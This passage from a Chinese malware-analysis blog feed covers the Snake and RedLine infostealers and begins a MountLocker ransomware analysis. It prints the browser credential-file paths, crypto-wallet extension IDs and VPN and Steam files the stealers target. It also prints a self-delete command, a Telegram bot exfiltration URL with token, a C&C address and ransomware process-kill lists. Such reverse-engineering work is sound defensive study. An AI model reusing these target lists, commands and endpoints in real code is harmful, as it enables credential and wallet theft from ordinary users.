<td style="text-align:left">CocCoc</td>
<td style="text-align:left">%LocalAppData%\CocCoc\Browser\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">QQBrowser</td>
<td style="text-align:left">%LocalAppData%\Tencent\QQBrowser\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Orbitum</td>
<td style="text-align:left">%LocalAppData%\Orbitum\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Slimjet</td>
<td style="text-align:left">%LocalAppData%\Slimjet\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Iridium</td>
<td style="text-align:left">%LocalAppData%\Iridium\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Vivaldi</td>
<td style="text-align:left">%LocalAppData%\Vivaldi\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Iron</td>
<td style="text-align:left">%LocalAppData%\Chromium\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Chromium</td>
<td style="text-align:left">%LocalAppData%\Chromium\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Ghost</td>
<td style="text-align:left">%LocalAppData%\GhostBrowser\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Cent</td>
<td style="text-align:left">%LocalAppData%\CentBrowser\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Xvast</td>
<td style="text-align:left">%LocalAppData%\Xvast\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Chedot</td>
<td style="text-align:left">%LocalAppData%\Chedot\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">SuperBird</td>
<td style="text-align:left">%LocalAppData%\SuperBird\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">360Browser</td>
<td style="text-align:left">%LocalAppData%\360Browser\Browser\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">360Chrome</td>
<td style="text-align:left">%LocalAppData%\360Chrome\Chrome\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Comodo</td>
<td style="text-align:left">%LocalAppData%\Comodo\Dragon\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Brave</td>
<td style="text-align:left">%LocalAppData%\BraveSoftware\Brave-Browser\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Torch</td>
<td style="text-align:left">%LocalAppData%\Torch\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">UCBrowser</td>
<td style="text-align:left">%LocalAppData%\UCBrowser\User Data_i18n\Default\UC Login Data.18</td>
</tr>
<tr>
<td style="text-align:left">Blisk</td>
<td style="text-align:left">%LocalAppData%\Blisk\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Epic</td>
<td style="text-align:left">%LocalAppData%\Epic Privacy Browser\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Opera</td>
<td style="text-align:left">%AppData%\Opera Software\Opera Stable\Login Data<!-- raw HTML omitted -->%AppData%\Opera\Opera\profile\wand.dat</td>
</tr>
<tr>
<td style="text-align:left">Liebao</td>
<td style="text-align:left">%LocalAppData%\Liebao7\User Data\Default\EncryptedStorage</td>
</tr>
<tr>
<td style="text-align:left">Avast</td>
<td style="text-align:left">%LocalAppData%\AVAST Software\Browser\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Kinza</td>
<td style="text-align:left">%LocalAppData%\Kinza\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">BlackHawk</td>
<td style="text-align:left">%LocalAppData%\BlackHawk\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Citrio</td>
<td style="text-align:left">%LocalAppData%\CatalinaGroup\Citrio\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Uran</td>
<td style="text-align:left">%LocalAppData%\uCozMedia\Uran\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Coowon</td>
<td style="text-align:left">%LocalAppData%\Coowon\Coowon\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">7Star</td>
<td style="text-align:left">%LocalAppData%\7Star\7Star\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">QIP Surf</td>
<td style="text-align:left">%LocalAppData%\QIP Surf\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Sleipnir</td>
<td style="text-align:left">%AppData%\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Chrome Canary</td>
<td style="text-align:left">%LocalAppData%\Google\Chrome SxS\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">CoolNovo</td>
<td style="text-align:left">%LocalAppData%\MapleStudio\ChromePlus\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">SalamWeb</td>
<td style="text-align:left">%LocalAppData%\SalamWeb\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Sputnik</td>
<td style="text-align:left">%LocalAppData%\Sputnik\Sputnik\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Falkon</td>
<td style="text-align:left">%LocalAppData%\Sputnik\Sputnik\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Elements</td>
<td style="text-align:left">%LocalAppData%\Elements Browser\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">Edge Chromium</td>
<td style="text-align:left">%LocalAppData%\Microsoft\Edge\User Data\Default\Login Data</td>
</tr>
<tr>
<td style="text-align:left">IceCat</td>
<td style="text-align:left">%AppData%Mozilla\icecat\Profiles\logins.json</td>
</tr>
<tr>
<td style="text-align:left">Slim</td>
<td style="text-align:left">%AppData%FlashPeak\SlimBrowser\Profiles\logins.json</td>
</tr>
<tr>
<td style="text-align:left">Firefox</td>
<td style="text-align:left">%AppData%Mozilla\Firefox\Profiles\logins.json</td>
</tr>
<tr>
<td style="text-align:left">SeaMonkey</td>
<td style="text-align:left">%AppData%Mozilla\SeaMonkey\Profiles\logins.json</td>
</tr>
<tr>
<td style="text-align:left">Ice Dragon</td>
<td style="text-align:left">%AppData%Comodo\IceDragon\Profiles\logins.json</td>
</tr>
<tr>
<td style="text-align:left">CyberFox</td>
<td style="text-align:left">%AppData%8pecxstudios\Cyberfox\Profiles</td>
</tr>
<tr>
<td style="text-align:left">PaleMoon</td>
<td style="text-align:left">%AppData%Moonchild Productions\Pale Moon\Profiles\logins.json</td>
</tr>
<tr>
<td style="text-align:left">WaterFox</td>
<td style="text-align:left">%AppData%Waterfox\Profiles\logins.json</td>
</tr>
</tbody>
</table>
<p><strong>注：</strong> 对于<code>Iron</code>和<code>Falkon</code>明显路径错误，但作者的源代码中确实如此，大概是作者沉迷<code>copy</code>，忘了修改<code>-.-</code></p>
<h4 id="357--定时发送数据">3.5.7.  定时发送数据</h4>
<p>从源码中可以看到作者设定了<code>7</code>个定时器：</p>
<p><img src="/snake_images/314473017217535.png" alt=""></p>
<p><code>Time_0</code>：<code>Send keystroke Logs</code></p>
<p><img src="/snake_images/61274217237701.png" alt=""></p>
<p><code>Time_1</code>：<code>Send Screenshot Logs</code></p>
<p><img src="/snake_images/72804517230370.png" alt=""></p>
<p><code>Time_2</code>：<code>Get Clipboard Text</code></p>
<p><img src="/snake_images/360704517226925.png" alt=""></p>
<p><code>Time_3</code>：<code>Send Clipboard Logs</code></p>
<p><img src="/snake_images/571014517222679.png" alt=""></p>
<p><code>Time_4</code>：<code>Null</code></p>
<p><img src="/snake_images/125024617240559.png" alt=""></p>
<p><code>Time_5</code>：<code>Send Passwords</code></p>
<p><img src="/snake_images/334874617238163.png" alt=""></p>
<p><code>Time_6</code>：<code>Null</code></p>
<p><img src="/snake_images/491184617235665.png" alt=""></p>
<h4 id="358--自我删除功能">3.5.8.  自我删除功能</h4>
<p>样本存在自我删除函数，当调用该函数三秒后，将进行自我删除。函数执行的命令是：<code>cmd.exe /C choice /C Y /N /D Y /T 3 &amp; Del &quot;Application.ExecutablePath&quot;</code></p>
<p><img src="/snake_images/4012644198092.png" alt=""></p>
<h4 id="359--发送函数解析">3.5.9.  发送函数解析</h4>
<p>作者实现了三种模式用于发送窃取的数据：<code>FTP</code>、<code>SMTP</code>、<code>Telegram</code>。</p>
<p><code>FTP</code>：登录到配置的<code>FTP</code>服务器，采用<code>STOR</code>命令将窃取的数据上传到服务器：</p>
<p><img src="/snake_images/393440118239346.png" alt=""></p>
<p><code>SMTP</code>：登录配置的<code>SMTP</code>服务器，然后向恶意电子邮件地址发送带有附件的电子邮件，附件存储窃取的数据：</p>
<p><img src="/snake_images/590000218234482.png" alt=""></p>
<p><code>Telegram</code>：向<code>Telegram</code>端点<code>api.telegram.org</code>发出<code>POST</code>请求，内容为窃取的数据内容：</p>
<p><img src="/snake_images/359200518228028.png" alt=""></p>
<p>在该样本中，作者写定了传输方式：<code>private static string string_4 = &quot;$%TelegramDv$&quot;;</code></p>
<p>最终获取到<code>Telegram</code>会话链接为：<code>https://api.telegram.org/bot1846952933:AAEgp2ulfucRILQNH4ZSk6CAr7cPDJZxCPs/sendDocument?chat_id=840259816&amp;caption=***</code></p>
<h2 id="4-参考资料">4. 参考资料</h2>
<pre tabindex="0"><code>https://www.cybereason.com/blog/threat-analysis-report-snake-infostealer-malware
https://www.virustotal.com/gui/file/132482335f028ceb6094d9c29442faf900d838fb054eebbbf39208bb39ccf5ae
https://app.any.run/tasks/345a0eae-3a65-4b1a-9719-45a23c751f92/#
</code></pre>]]></content>
		</item>
		
		<item>
			<title>RedLine</title>
			<link>https://www.a1ee.cn/medium/redline/</link>
			<pubDate>Mon, 01 Nov 2021 15:45:24 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/redline/</guid>
			<description>RedLine 样本分析 1. 前言 VirusTotal样本信息 MalwareBazaar样本信息 unpacme解包文件 AnyRun检测结果 根据unpacme结</description>
			<content type="html"><![CDATA[<h1 id="redline-样本分析">RedLine 样本分析</h1>
<h2 id="1-前言">1. 前言</h2>
<p><a href="https://www.virustotal.com/gui/file/43bf339f8d440b52a1a8385223ff7c15674952c020325c5839c99a8291e97512">VirusTotal样本信息</a></p>
<p><a href="https://bazaar.abuse.ch/sample/43bf339f8d440b52a1a8385223ff7c15674952c020325c5839c99a8291e97512/">MalwareBazaar样本信息</a></p>
<p><a href="https://www.unpac.me/results/d8b3bed4-85d1-4e75-95cf-3770fd5c55cf">unpacme解包文件</a></p>
<p><a href="https://app.any.run/tasks/32858da1-fef5-4980-b3c8-65cbf7fb2504/">AnyRun检测结果</a></p>
<p>根据<code>unpacme</code>结果，逐个查看可知恶意载荷的<code>SHA256</code>为：<code>b1d6c8d2b9498001f50dab84090b9caf31f864871cfc995ffea41c22d2da9d28</code></p>
<h2 id="2-恶意程序分析">2. 恶意程序分析</h2>
<h3 id="21-cc交互">2.1. CC交互</h3>
<p>从函数入口开始分析，可以看到样本载入了配置文件：</p>
<p><img src="/redline_images/4039744161067.png" alt=""></p>
<p>后面会有动态解密过程，获取C&amp;C服务器地址端口：<code>45.9.20.182:52236</code></p>
<p><img src="/redline_images/2791422189493.png" alt=""></p>
<p>请求报文<code>header</code>格式如下：</p>
<pre tabindex="0"><code>{&lt;Authorization xmlns=&#34;ns1&#34;&gt;a272f3a2850ec3dccdaed97234b7c40e&lt;/Authorization&gt;}
</code></pre><p><img src="/redline_images/4782429177360.png" alt=""></p>
<p>发送链接请求后等待服务器响应：</p>
<p><img src="/redline_images/2256927187529.png" alt=""></p>
<p>实例化参数列表如下：</p>
<p><img src="/redline_images/2155748091070.png" alt=""></p>
<p>实例化本地规则列表如下：</p>
<p><img src="/redline_images/4342651109496.png" alt=""></p>
<h3 id="22-主要功能">2.2. 主要功能</h3>
<p>当服务器响应后，从报文中获取参数，并根据参数内容执行对应的功能函数，但作者在实例化函数列表时，对函数名混淆了：</p>
<p><img src="/redline_images/4485152097363.png" alt=""></p>
<p>不过好在每个函数的功能很明确，逐个函数进行功能确认后，可以得出真实的功能函数列表如下：</p>
<p><img src="/redline_images/5417928180198.png" alt=""></p>
<h4 id="221-获取硬件信息">2.2.1. 获取硬件信息</h4>
<p><img src="/redline_images/3952608186753.png" alt=""></p>
<h4 id="222-获取浏览器信息">2.2.2. 获取浏览器信息</h4>
<p>会读取注册表已获取默认浏览器的信息</p>
<pre tabindex="0"><code>SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet
SOFTWARE\\Clients\\StartMenuInternet
</code></pre><p><img src="/redline_images/255814182507.png" alt=""></p>
<h4 id="223-获取软件列表">2.2.3. 获取软件列表</h4>
<p>通过查看注册表：<code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall</code>获取软件列表，再通过<code>DisplayName</code>获取软件名；<code>DisplayVersion</code>获取软件列表：</p>
<p><img src="/redline_images/3981249200387.png" alt=""></p>
<h4 id="224-获取杀毒防护软件列表">2.2.4. 获取杀毒防护软件列表</h4>
<p>通过<code>SystemInfoHelper.GetVs()</code>函数已<code> WMI</code>查询<code>SELECT * FROM AntivirusProduct|AntiSpyWareProduct|FirewallProduct</code>，并将获取到的杀软防护软件存放在<code>ROOT\\SecurityCenter</code>和<code>ROOT\\SecurityCenter2</code>的 <code>WMI</code>命名空间中
<img src="/redline_images/1980228091142.png" alt=""></p>
<h4 id="225-获取进程列表">2.2.5. 获取进程列表</h4>
<p>通过执行<code>SELSystem.Text.RegularExpressionsECT * FRSystem.Text.RegularExpressionsOM Win32_PSystem.Text.RegularExpressionsrocess WSystem.Text.RegularExpressionshere SessSystem.Text.RegularExpressionsionId=''</code>语句获取系统进程列表信息并按照<code>ID</code>、<code>ProcessID</code>、<code>Name</code>、<code>CommandLine</code>形式存储</p>
<p><img src="/redline_images/5049521119568.png" alt=""></p>
<h4 id="226-获取本地安装的语言">2.2.6. 获取本地安装的语言</h4>
<p><img src="/redline_images/3858226107435.png" alt=""></p>
<h4 id="227-查询telegram文件">2.2.7. 查询Telegram文件</h4>
<p>如果配置文件中要求扫描<code>Telegram</code>，那么将对<code>Telegram</code>文件夹进行扫描</p>
<p><img src="/redline_images/2636727127601.png" alt=""></p>
<h4 id="228-扫描浏览器数据">2.2.8. 扫描浏览器数据</h4>
<p>如果配置文件中要求扫描浏览器，那么将执行<code>Chrome</code>、<code>Gecko</code>浏览器的数据扫描</p>
<p><img src="/redline_images/2602231120270.png" alt=""></p>
<p>其中<code>Chrome</code>浏览器将会查找<code>Login Data</code>、<code>Web Data</code>、<code>Cookies</code>路径，窃取<code>Opera GX Stable</code>、<code>Opera GX</code>、<code>AppData\\Roaming\\</code>中的浏览器数据</p>
<p><img src="/redline_images/2249334112579.png" alt=""></p>
<p><code>Gecko</code>浏览器则是窃取<code>cookies.sqlite</code>、<code>%USERPROFILE%\\AppData\\Roaming</code>目录下的浏览器数据</p>
<p><img src="/redline_images/170140130459.png" alt=""></p>
<h4 id="229-窃取文件数据">2.2.9. 窃取文件数据</h4>
<p>如果配置文件中设置了扫描文件选项，那么当接收到文件路径时，将对文件进行扫描</p>
<p><img src="/redline_images/2186948106806.png" alt=""></p>
<p>其中<code>GetFiles</code>函数覆盖了系统文件内容：<code>\\Windows\\</code>、<code>\\Program Files\\</code>、<code>\\Program Files (x86)\\</code>、<code>\\Program Data\\</code></p>
<p><img src="/redline_images/4168544125565.png" alt=""></p>
<h4 id="2210-窃取ftp数据">2.2.10. 窃取FTP数据</h4>
<p>如果配置文件中要求扫描<code>FTP</code>,则进行<code>FileZilla</code>文件扫描</p>
<p><img src="/redline_images/1806051129246.png" alt=""></p>
<p>扫描的路径是：<code>{0}\\FileZilla\\recentservers.xml</code>、<code>{0}\\FileZilla\\sitemanager.xml</code></p>
<p>窃密函数如下：</p>
<p><img src="/redline_images/5254854124382.png" alt=""></p>
<h4 id="2211-窃取加密钱包">2.2.11. 窃取加密钱包</h4>
<p>如果配置文件中要求窃取加密钱包，则会对<code>BrEx.Init</code>中已加密的钱包进行扫描</p>
<p><img src="/redline_images/858056117928.png" alt=""></p>
<p><code>BrEx.Init</code>中存储的是采用了<code>base64</code>编码的钱包字符串：</p>
<pre tabindex="0"><code>ZmZuYmVsZmRvZWlvaGVua2ppYm5tYWRqaWVoamhhamJ8WW9yb2lXYWxsZXQKaWJuZWpkZmptbWtwY25scGVia2xtbmtvZW9paG9mZWN8VHJvbmxpbmsKamJkYW9jbmVpaWlubWpiamxnYWxoY2VsZ2Jlam1uaWR8TmlmdHlXYWxsZXQKbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm58TWV0YW1hc2sKYWZiY2JqcGJwZmFkbGttaG1jbGhrZWVvZG1hbWNmbGN8TWF0aFdhbGxldApobmZhbmtub2NmZW9mYmRkZ2Npam5taG5mbmtkbmFhZHxDb2luYmFzZQpmaGJvaGltYWVsYm9ocGpiYmxkY25nY25hcG5kb2RqcHxCaW5hbmNlQ2hhaW4Kb2RiZnBlZWloZGtiaWhtb3BrYmptb29uZmFubGJmY2x8QnJhdmVXYWxsZXQKaHBnbGZoZ2ZuaGJncGpkZW5qZ21kZ29laWFwcGFmbG58R3VhcmRhV2FsbGV0CmJsbmllaWlmZmJvaWxsa25qbmVwb2dqaGtnbm9hcGFjfEVxdWFsV2FsbGV0CmNqZWxmcGxwbGViZGpqZW5sbHBqY2JsbWprZmNmZm5lfEpheHh4TGliZXJ0eQpmaWhrYWtmb2JrbWtqb2pwY2hwZmdjbWhmam5tbmZwaXxCaXRBcHBXYWxsZXQKa25jY2hkaWdvYmdoZW5iYmFkZG9qam5uYW9nZnBwZmp8aVdhbGxldAphbWttamptbWZsZGRvZ21ocGpsb2ltaXBib2ZuZmppaHxXb21iYXQKZmhpbGFoZWltZ2xpZ25kZGtqZ29ma2NiZ2VraGVuYmh8QXRvbWljV2FsbGV0Cm5sYm1ubmlqY25sZWdrampwY2ZqY2xtY2ZnZ2ZlZmRtfE1ld0N4Cm5hbmptZGtuaGtpbmlmbmtnZGNnZ2NmbmhkYWFtbW1qfEd1aWxkV2FsbGV0Cm5rZGRnbmNkamdqZmNkZGFtZmdjbWZubGhjY25pbWlnfFNhdHVybldhbGxldApmbmpobWtoaG1rYmpra2FibmRjbm5vZ2Fnb2dibmVlY3xSb25pbldhbGxldAphaWlmYm5iZm9icG1lZWtpcGhlZWlqaW1kcG5scGdwcHxUZXJyYVN0YXRpb24KZm5uZWdwaGxvYmpkcGtoZWNhcGtpampka2djamhraWJ8SGFybW9ueVdhbGxldAphZWFjaGtubWVmcGhlcGNjaW9uYm9vaGNrb25vZWVtZ3xDb2luOThXYWxsZXQKY2dlZW9kcGZhZ2pjZWVmaWVmbG1kZnBocGxrZW5sZmt8VG9uQ3J5c3RhbApwZGFkamtma2djYWZnYmNlaW1jcGJrYWxuZm5lcGJua3xLYXJkaWFDaGFpbg==
</code></pre><p>解码后的数据如下：</p>
<pre tabindex="0"><code>ffnbelfdoeiohenkjibnmadjiehjhajb|YoroiWallet
ibnejdfjmmkpcnlpebklmnkoeoihofec|Tronlink
jbdaocneiiinmjbjlgalhcelgbejmnid|NiftyWallet
nkbihfbeogaeaoehlefnkodbefgpgknn|Metamask
afbcbjpbpfadlkmhmclhkeeodmamcflc|MathWallet
hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase
fhbohimaelbohpjbbldcngcnapndodjp|BinanceChain
odbfpeeihdkbihmopkbjmoonfanlbfcl|BraveWallet
hpglfhgfnhbgpjdenjgmdgoeiappafln|GuardaWallet
blnieiiffboillknjnepogjhkgnoapac|EqualWallet
cjelfplplebdjjenllpjcblmjkfcffne|JaxxxLiberty
fihkakfobkmkjojpchpfgcmhfjnmnfpi|BitAppWallet
kncchdigobghenbbaddojjnnaogfppfj|iWallet
amkmjjmmflddogmhpjloimipbofnfjih|Wombat
fhilaheimglignddkjgofkcbgekhenbh|AtomicWallet
nlbmnnijcnlegkjjpcfjclmcfggfefdm|MewCx
nanjmdknhkinifnkgdcggcfnhdaammmj|GuildWallet
nkddgncdjgjfcddamfgcmfnlhccnimig|SaturnWallet
fnjhmkhhmkbjkkabndcnnogagogbneec|RoninWallet
aiifbnbfobpmeekipheeijimdpnlpgpp|TerraStation
fnnegphlobjdpkhecapkijjdkgcjhkib|HarmonyWallet
aeachknmefphepccionboohckonoeemg|Coin98Wallet
cgeeodpfagjceefieflmdfphplkenlfk|TonCrystal
pdadjkfkgcafgbceimcpbkalnfnepbnk|KardiaChain
</code></pre><h4 id="2212-窃取discord数据">2.2.12. 窃取Discord数据</h4>
<p>如果配置文件中要求扫描<code>Discord</code>，则会扫描<code>Discord</code>文件，<code>GetTokens()</code>函数则是获取<code>Tokens.txt</code>。</p>
<p><img src="/redline_images/2268106121062.png" alt=""></p>
<h4 id="2213-窃取steam数据">2.2.13. 窃取Steam数据</h4>
<p>如果配置文件中要求扫描<code>Steam</code>，则会调用<code>GameLauncher()</code>窃取<code>Steam</code>登录凭证</p>
<p><img src="/redline_images/2279416111592.png" alt=""></p>
<p><code>GameLauncher()</code>函数会扫描注册表<code>Software\\Valve\\Steam</code>中的<code>SteamPath</code>值获取安装路径，然后窃取<code>*ssfn*</code>、<code>config</code>、<code>*.vdf</code>文件。</p>
<h4 id="2214-窃取vpn数据">2.2.14. 窃取VPN数据</h4>
<p>如果配置文件中要求扫描<code>VPN</code>，则会对<code>NordVPN</code>、<code>OpenVPN</code>和<code>ProtonVPN</code>进行文件窃取</p>
<p><img src="/redline_images/2289828114096.png" alt=""></p>
<p>针对<code>NordVPN</code>，首先从<code>%USERPROFILE%\\AppData\\Local</code>路径扫描<code>NordVPN</code>文件夹，获取<code>user.config</code>，然后再<code>xml</code>文件中匹配<code>//setting[@name=\\Username\\]/value</code>和<code>//setting[@name=\\Password\\]/value</code>窃取用户密码，然后采用内置的解密函数<code>CryptoHelper.DecryptBlob</code>进行解密：</p>
<p><img src="/redline_images/3529732123043.png" alt=""></p>
<p>针对<code>OpenVPN</code>，首先从<code>%USERPROFILE%\\AppData\\Roaming</code>路径扫描<code>OpenVPN Connect</code>文件夹，进入<code>profiles</code>文件夹，然后扫描<code>npvo*</code>文件；</p>
<p>针对<code>ProtonVPN</code>，首先从<code>%USERPROFILE%\\AppData\\Local</code>路径扫描<code>ProtonVPN</code>文件夹，然后扫描<code>npvo*</code>文件。</p>
<h4 id="2215-截取屏幕">2.2.15. 截取屏幕</h4>
<p>如果配置中要求截取屏幕，则调用<code>GdiHelper.GetImageBase()</code>函数截取屏幕</p>
<p><img src="/redline_images/4231349145928.png" alt=""></p>
<h4 id="2216-获取用户名">2.2.16. 获取用户名</h4>
<p>直接调用系统<code>API</code>获取用户名</p>
<p><img src="/redline_images/1307955146537.png" alt=""></p>
<h4 id="2217-获取显示器大小">2.2.17. 获取显示器大小</h4>
<p>调用<code>GdiHelper.MonitorSize()</code>函数以获取显示器长宽大小</p>
<p><img src="/redline_images/4828655173492.png" alt=""></p>
<h4 id="2218-获取系统版本">2.2.18. 获取系统版本</h4>
<p>调用<code>SystemInfoHelper.GetWindowsVersion()</code>函数查询注册表：<code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion</code>，以获取用户系统版本信息</p>
<p><img src="/redline_images/285659145003.png" alt=""></p>
<h4 id="2219-获取自身路径">2.2.19. 获取自身路径</h4>
<p>调用系统<code>API</code>获取当前运行路径</p>
<p><img src="/redline_images/45700151254.png" alt=""></p>
<h4 id="2220-获取硬件id">2.2.20. 获取硬件ID</h4>
<p>根据当前用户关联的网络域名、当前线程相关联的用户名和<code>Win32_DiskDrive</code>对象信息计算<code>MD5</code>生成<code>HardwareID</code></p>
<p><img src="/redline_images/2406200151393.png" alt=""></p>
<h4 id="2221-获取时区">2.2.21. 获取时区</h4>
<p>调用系统<code>API</code>获取主机所在的时区信息</p>
<p><img src="/redline_images/1418309163483.png" alt=""></p>
<h3 id="23-发送详情">2.3. 发送详情</h3>
<p>当获取到上述数据后，会调用<code>Send()</code>函数，将扫描的详情进行填充，</p>
<p><img src="/redline_images/5122110168522.png" alt=""></p>
<p>其中<code>PartsSender.GetLocalInfo()</code>函数，会在主机上访问<code>http://733s.komawai.ru/</code>，该链接将返回主机的相关信息：</p>
<pre tabindex="0"><code>{&#34;city&#34;:&#34;***&#34;,&#34;country_code&#34;:&#34;***&#34;,&#34;postal&#34;:null,&#34;ip&#34;:&#34;*.*.*.*&#34;}
</code></pre><p>解析上述<code>json</code>文件，填充到发送请求中：</p>
<p><img src="/redline_images/1305416169817.png" alt=""></p>
<h3 id="24-远程下载">2.4. 远程下载</h3>
<p>当上述的发送请求结束，将会调用<code>TaskResolver()</code>函数</p>
<p><img src="/redline_images/4939619170819.png" alt=""></p>
<p>该函数有四个方法：<code>CommandLineUpdate()</code>、<code>DownloadUpdate()</code>、<code>DownloadAndExecuteUpdate()</code>、<code>OpenUpdate()</code></p>
<p><img src="/redline_images/3430930172827.png" alt=""></p>
<p><code>DownloadAndExecuteUpdate()</code>函数采用<code>WebClient().DownloadFile()</code>下载文件，并使用<code>System.Diagnostics.Process.Start()</code>运行</p>
<p><img src="/redline_images/2031022156548.png" alt=""></p>
]]></content>
		</item>
		
		<item>
			<title>MountLocker</title>
			<link>https://www.a1ee.cn/medium/mountlocker/</link>
			<pubDate>Mon, 01 Nov 2021 15:45:13 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/mountlocker/</guid>
			<description>MountLocker 样本分析 样本信息 样本来源：MALWAREbazaar 相关报告：VirusTotal扫描报告 样本md5：3808F21E56DEDE99BC</description>
			<content type="html"><![CDATA[<h1 id="mountlocker-样本分析">MountLocker 样本分析</h1>
<h2 id="样本信息">样本信息</h2>
<p>样本来源：<a href="https://bazaar.abuse.ch/sample/4a5ac3c6f8383cc33c795804ba5f7f5553c029bbb4a6d28f1e4d8fb5107902c1/">MALWAREbazaar</a></p>
<p>相关报告：<a href="https://www.virustotal.com/gui/file/4a5ac3c6f8383cc33c795804ba5f7f5553c029bbb4a6d28f1e4d8fb5107902c1/detection">VirusTotal扫描报告</a></p>
<p>样本md5：3808F21E56DEDE99BC914D90AEABE47A</p>
<p>样本sha256：4A5AC3C6F8383CC33C795804BA5F7F5553C029BBB4A6D28F1E4D8FB5107902C1</p>
<h2 id="行为结果">行为结果</h2>
<p>运行样本后，样本首先将对硬盘内的文件进行遍历，对部分文件进行加密，并以<code>ReadManual.***</code>后缀结尾、创建日志文件和恢复说明<code>html</code>。</p>
<p><img src="/mountlocker_images/4442910100867.png" alt=""></p>
<p><code>MountLocker.exe.log</code>日志文件（精简了DEFAULT LOCK部分）如下：</p>
<p><img src="/mountlocker_images/1911120119293.png" alt=""></p>
<p><code>RecoveryManual.html</code>恢复说明文件内容如下：</p>
<p><img src="/mountlocker_images/352923107160.png" alt=""></p>
<h2 id="静态分析">静态分析</h2>
<h3 id="参数获取">参数获取</h3>
<p>样本的第一个函数就是处理命令参数的函数，进来后可以看到一连串的参数匹配：</p>
<p><img src="/mountlocker_images/3729710160867.png" alt=""></p>
<h3 id="创建日志文件">创建日志文件</h3>
<p>参数获取完成后，进入下一个函数内，该函数首先判断用户权限，然后获取样本路径，直接在该路径后添加<code>.log</code>创建日志文件：</p>
<p><img src="/mountlocker_images/3077115090872.png" alt=""></p>
<h3 id="写入系统信息">写入系统信息</h3>
<p>读取<code>console</code>参数，决定是否终端显示日志，然后向日志文件写入当前版本及系统信息：</p>
<p><img src="/mountlocker_images/632409189294.png" alt=""></p>
<h3 id="初始化">初始化</h3>
<p><code>LockerInit()</code>将初始化恶意程序，提升权限、生成密钥</p>
<p><img src="/mountlocker_images/643420097165.png" alt=""></p>
<p>然后生成<code>RecoveryManual.html</code>：
<img src="/mountlocker_images/2441221117331.png" alt=""></p>
<h3 id="终止服务">终止服务</h3>
<p>如果未输入<code>network</code>且未输入<code>nokill</code>参数，则杀死指定服务</p>
<p><img src="/mountlocker_images/5803501119297.png" alt=""></p>
<p>服务列表为：包含字符串<code>SQL</code>、<code>database</code>、<code>msexchange</code>的服务</p>
<p><img src="/mountlocker_images/5359453090871.png" alt=""></p>
<h3 id="终止进程">终止进程</h3>
<p>使用<code>ZwQuerySystemInformation</code>获取当前进程列表。</p>
<p><img src="/mountlocker_images/3669117107164.png" alt=""></p>
<p>然后进行列表比对，杀死指定进程</p>
<p><img src="/mountlocker_images/2802719119999.png" alt=""></p>
<p>进程列表如下：</p>
<pre tabindex="0"><code>&#34;msftesql.exe&#34;、&#34;sqlagent.exe&#34;、&#34;sqlbrowser.exe&#34;、&#34;sqlwriter.exe&#34;、&#34;oracle.exe&#34;、&#34;ocssd.exe&#34;、&#34;dbsnmp.exe&#34;、&#34;synctime.exe&#34;、&#34;agntsvc.exe&#34;、&#34;isqlplussvc.exe&#34;、&#34;xfssvccon.exe&#34;、&#34;sqlservr.exe&#34;、&#34;mydesktopservice.exe&#34;、&#34;ocautoupds.exe&#34;、&#34;encsvc.exe&#34;、&#34;firefoxconfig.exe&#34;、&#34;tbirdconfig.exe&#34;、&#34;mydesktopqos.exe&#34;、&#34;ocomm.exe&#34;、&#34;mysqld.exe&#34;、&#34;mysqld-nt.exe&#34;、&#34;mysqld-opt.exe&#34;、&#34;dbeng50.exe&#34;、&#34;sqbcoreservice.exe&#34;、&#34;excel.exe&#34;、&#34;infopath.exe&#34;、&#34;msaccess.exe&#34;、&#34;mspub.exe&#34;、&#34;onenote.exe&#34;、&#34;outlook.exe&#34;、&#34;powerpnt.exe&#34;、&#34;sqlservr.exe&#34;、&#34;thebat.exe&#34;、&#34;steam.exe&#34;、&#34;thebat64.exe&#34;、&#34;thunderbird.exe&#34;、&#34;visio.exe&#34;、&#34;winword.exe&#34;、&#34;word